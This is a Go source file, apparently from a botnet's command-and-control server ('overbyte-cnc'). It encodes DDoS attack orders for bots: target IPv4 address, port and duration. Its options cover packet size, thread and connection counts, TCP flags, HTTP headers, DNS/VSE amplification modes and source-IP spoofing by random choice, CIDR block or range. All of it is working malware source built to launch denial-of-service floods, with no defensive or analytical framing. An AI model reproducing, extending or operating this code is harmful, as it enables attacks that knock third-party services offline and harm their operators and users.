package attack

import (
	"encoding/binary"
	"encoding/hex"
	"fmt"
	"net"
	"strconv"
	"strings"

	"overbyte-cnc/bot"
)

func Build(method string, targetIP string, targetPort, duration int, options map[string]string) ([]byte, error) {
	cmd, exists := bot.MethodMap[strings.ToLower(method)]
	if !exists {
		return nil, fmt.Errorf("unknown attack method: %s", method)
	}

	ip := net.ParseIP(targetIP).To4()
	if ip == nil {
		return nil, fmt.Errorf("invalid IPv4 address: %s", targetIP)
	}

	var buf []byte
	if bot.IsL3Attack(method) {
		buf = make([]byte, 9)
		buf[0] = cmd
		copy(buf[1:5], ip)
		binary.BigEndian.PutUint32(buf[5:9], uint32(duration))
	} else {
		buf = make([]byte, 11)
		buf[0] = cmd
		copy(buf[1:5], ip)
		binary.BigEndian.PutUint16(buf[5:7], uint16(targetPort))
		binary.BigEndian.PutUint32(buf[7:11], uint32(duration))
	}

	if modeName, hasMode := options["mode"]; hasMode {
		modeVal, ok := bot.GetModeValue(strings.ToLower(method), strings.ToLower(modeName))
		if ok {
			optBuf := make([]byte, 4)
			optBuf[0] = bot.OPT_MODE
			binary.BigEndian.PutUint16(optBuf[1:3], 1)
			optBuf[3] = modeVal
			buf = append(buf, optBuf...)
		}
		delete(options, "mode")
	}

	for name, value := range options {
		optType, exists := bot.OptionMap[strings.ToLower(name)]
		if !exists {
			continue
		}

		optData := encodeOptionValue(optType, value)
		if optData == nil {
			continue
		}

		optBuf := make([]byte, 3+len(optData))
		optBuf[0] = optType
		binary.BigEndian.PutUint16(optBuf[1:3], uint16(len(optData)))
		copy(optBuf[3:], optData)

		buf = append(buf, optBuf...)
	}

	return buf, nil
}

func encodeOptionValue(optType byte, value string) []byte {
	switch optType {
	case bot.OPT_PSIZE, bot.OPT_SRCPORT,
		bot.OPT_THREADS, bot.OPT_CONNS, bot.OPT_RATE:
		num, err := strconv.ParseUint(value, 10, 16)
		if err != nil {
			return nil
		}
		buf := make([]byte, 2)
		binary.BigEndian.PutUint16(buf, uint16(num))
		return buf

	case bot.OPT_PPS:
		num, err := strconv.ParseUint(value, 10, 32)
		if err != nil {
			return nil
		}
		buf := make([]byte, 4)
		binary.BigEndian.PutUint32(buf, uint32(num))
		return buf

	case bot.OPT_RAND, bot.OPT_FRAG, bot.OPT_TTL, bot.OPT_TOS,
		bot.OPT_TCPOPTS, bot.OPT_UARAND, bot.OPT_RANDPATH,
		bot.OPT_KEEPALIVE, bot.OPT_PIPELINE:
		num, err := strconv.ParseUint(value, 10, 8)
		if err != nil {
			return nil
		}
		return []byte{byte(num)}

	case bot.OPT_PAYLOAD:
		data, err := hex.DecodeString(value)
		if err != nil {
			return []byte(value)
		}
		return data

	case bot.OPT_TCPFLAGS:
		flagMap := map[string]uint8{
			"fin": 0x01,
			"syn": 0x02,
			"rst": 0x04,
			"psh": 0x08,
			"ack": 0x10,
			"urg": 0x20,
			"ece": 0x40,
			"cwr": 0x80,
		}
		var flags uint8 = 0
		parts := strings.Split(strings.ToLower(value), ",")
		for _, p := range parts {
			p = strings.TrimSpace(p)
			if f, ok := flagMap[p]; ok {
				flags |= f
			}
		}
		if flags == 0 {
			num, err := strconv.ParseUint(value, 10, 8)
			if err == nil {
				flags = uint8(num)
			}
		}
		if flags == 0 {
			return nil
		}
		return []byte{flags}

	case bot.OPT_SPOOF:
		return encodeSpoofValue(value)

	case bot.OPT_METHOD, bot.OPT_PATH, bot.OPT_DOMAIN, bot.OPT_COOKIE,
		bot.OPT_REFERER, bot.OPT_USERAGENT, bot.OPT_POSTDATA:
		return []byte(value)
	}

	return nil
}

func encodeSpoofValue(value string) []byte {
	value = strings.TrimSpace(strings.ToLower(value))

	if value == "random" {
		return []byte{0x01}
	}

	// CIDR: e.g. "10.0.0.0/24"
	if strings.Contains(value, "/") {
		_, ipNet, err := net.ParseCIDR(value)
		if err != nil {
			return nil
		}
		ip4 := ipNet.IP.To4()
		if ip4 == nil {
			return nil
		}
		ones, _ := ipNet.Mask.Size()
		buf := make([]byte, 6)
		buf[0] = 0x02
		copy(buf[1:5], ip4)
		buf[5] = byte(ones)
		return buf
	}

	// Range: e.g. "10.0.0.1-10.0.0.254"
	if strings.Contains(value, "-") {
		parts := strings.SplitN(value, "-", 2)
		if len(parts) != 2 {
			return nil
		}
		startIP := net.ParseIP(strings.TrimSpace(parts[0])).To4()
		endIP := net.ParseIP(strings.TrimSpace(parts[1])).To4()
		if startIP == nil || endIP == nil {
			return nil
		}
		buf := make([]byte, 9)
		buf[0] = 0x03
		copy(buf[1:5], startIP)
		copy(buf[5:9], endIP)
		return buf
	}

	return nil
}

func ParseOptions(args []string) map[string]string {
	opts := make(map[string]string)
	for _, arg := range args {
		parts := strings.SplitN(arg, "=", 2)
		if len(parts) == 2 {
			opts[parts[0]] = parts[1]
		}
	}
	return opts
}

func ValidateOptions(method string, options map[string]string) (map[string]string, []string) {
	var warnings []string
	cleaned := make(map[string]string)
	for k, v := range options {
		cleaned[k] = v
	}

	modeName := strings.ToLower(cleaned["mode"])

	if psizeStr, ok := cleaned["psize"]; ok {
		psize, err := strconv.Atoi(psizeStr)
		if err == nil {
			isAmp := false
			ampSizes := map[string]int{
				"dns": 28, "vse": 25,
			}

			if method == "udp" {
				if sz, found := ampSizes[modeName]; found {
					isAmp = true
					if psize != sz {
						warnings = append(warnings, fmt.Sprintf("psize forced to %d for %s mode (amp payload)", sz, modeName))
						cleaned["psize"] = strconv.Itoa(sz)
					}
				}
				if !isAmp {
					if psize < 1 {
						warnings = append(warnings, "psize too small, set to 64")
						cleaned["psize"] = "64"
					} else if psize > 1450 {
						warnings = append(warnings, "psize clamped to 1450 (UDP max)")
						cleaned["psize"] = "1450"
					}
				}
			} else if method == "tcp" {
				if psize > 1400 {
					warnings = append(warnings, "psize clamped to 1400 (TCP max)")
					cleaned["psize"] = "1400"
				}
			} else if method == "icmp" {
				if psize < 8 {
					warnings = append(warnings, "psize too small, set to 8")
					cleaned["psize"] = "8"
				} else if psize > 65500 {
					warnings = append(warnings, "psize clamped to 65500 (ICMP max)")
					cleaned["psize"] = "65500"
				}
			} else if method == "gre" {
				if psize > 1400 {
					warnings = append(warnings, "psize clamped to 1400 (GRE max)")
					cleaned["psize"] = "1400"
				}
			}
		}
	}

	if threadsStr, ok := cleaned["threads"]; ok {
		threads, err := strconv.Atoi(threadsStr)
		if err == nil {
			if threads < 1 {
				warnings = append(warnings, "threads set to 1 (minimum)")
				cleaned["threads"] = "1"
			} else if threads > 4 {
				warnings = append(warnings, fmt.Sprintf("threads clamped from %d to 4 (max)", threads))
				cleaned["threads"] = "4"
			}
		}
	}

	if randStr, ok := cleaned["rand"]; ok {
		rand, err := strconv.Atoi(randStr)
		if err == nil {
			if rand < 0 || rand > 3 {
				warnings = append(warnings, fmt.Sprintf("rand=%d invalid (0-3), removed", rand))
				delete(cleaned, "rand")
			} else if rand == 3 && method == "tcp" {
				warnings = append(warnings, "rand=3 on TCP adds micro-delay per batch (may reduce throughput)")
			}
		}
	}

	if fragStr, ok := cleaned["frag"]; ok {
		frag, err := strconv.Atoi(fragStr)
		if err == nil && (frag < 0 || frag > 2) {
			warnings = append(warnings, fmt.Sprintf("frag=%d invalid (0-2), removed", frag))
			delete(cleaned, "frag")
		}
	}

	if spoofStr, ok := cleaned["spoof"]; ok {
		if method == "http" || method == "https" {
			warnings = append(warnings, "spoof not applicable to L7 methods, removed")
			delete(cleaned, "spoof")
		} else if method == "tcp" && (modeName == "handshake" || modeName == "socket") {
			warnings = append(warnings, "spoof not applicable to TCP handshake/socket modes (uses connect()), removed")
			delete(cleaned, "spoof")
		} else {
			spoofLower := strings.ToLower(strings.TrimSpace(spoofStr))
			valid := false
			if spoofLower == "random" {
				valid = true
			} else if strings.Contains(spoofLower, "/") {
				_, ipNet, err := net.ParseCIDR(spoofLower)
				if err != nil || ipNet.IP.To4() == nil {
					warnings = append(warnings, fmt.Sprintf("spoof=%s invalid CIDR, removed", spoofStr))
				} else {
					ones, _ := ipNet.Mask.Size()
					if ones < 8 || ones > 30 {
						warnings = append(warnings, fmt.Sprintf("spoof CIDR prefix /%d out of range (8-30), removed", ones))
					} else {
						valid = true
					}
				}
			} else if strings.Contains(spoofLower, "-") {
				parts := strings.SplitN(spoofLower, "-", 2)
				startIP := net.ParseIP(strings.TrimSpace(parts[0])).To4()
				endIP := net.ParseIP(strings.TrimSpace(parts[1])).To4()
				if startIP == nil || endIP == nil {
					warnings = append(warnings, fmt.Sprintf("spoof=%s invalid IP range, removed", spoofStr))
				} else {
					s := binary.BigEndian.Uint32(startIP)
					e := binary.BigEndian.Uint32(endIP)
					if e <= s {
						warnings = append(warnings, "spoof range: end must be greater than start, removed")
					} else {
						valid = true
					}
				}
			} else {
				warnings = append(warnings, fmt.Sprintf("spoof=%s invalid (use: random, CIDR, or IP range), removed", spoofStr))
			}
			if !valid {
				delete(cleaned, "spoof")
			}
		}
	}

	if ttlStr, ok := cleaned["ttl"]; ok {
		ttl, err := strconv.Atoi(ttlStr)
		if err == nil {
			if ttl <= 0 {
				warnings = append(warnings, "ttl=0 would drop at first hop, set to 64")
				cleaned["ttl"] = "64"
			} else if ttl > 255 {
				warnings = append(warnings, "ttl clamped to 255")
				cleaned["ttl"] = "255"
			}
		}
	}

	if connsStr, ok := cleaned["conns"]; ok {
		conns, err := strconv.Atoi(connsStr)
		if err == nil {
		maxConns := 4096
		if method == "http" {
			maxConns = 512
		} else if method == "https" {
			maxConns = 256
		}
			if conns > maxConns {
				warnings = append(warnings, fmt.Sprintf("conns clamped from %d to %d (max)", conns, maxConns))
				cleaned["conns"] = strconv.Itoa(maxConns)
			} else if conns < 1 {
				warnings = append(warnings, "conns set to 1 (minimum)")
				cleaned["conns"] = "1"
			}
		}
	}

	if pipeStr, ok := cleaned["pipeline"]; ok {
		pipe, err := strconv.Atoi(pipeStr)
		if err == nil && pipe > 10 {
			warnings = append(warnings, "pipeline clamped to 10 (max)")
			cleaned["pipeline"] = "10"
		}
	}

	if rateStr, ok := cleaned["rate"]; ok {
		rate, err := strconv.Atoi(rateStr)
		if err == nil && rate > 65535 {
			warnings = append(warnings, "rate clamped to 65535 (max uint16)")
			cleaned["rate"] = "65535"
		}
	}

	if method == "http" || method == "https" {
		if _, hasDomain := cleaned["domain"]; !hasDomain {
			warnings = append(warnings, fmt.Sprintf("%s attack without domain option - Host header will use IP", strings.ToUpper(method)))
		}
	}

	return cleaned, warnings
}
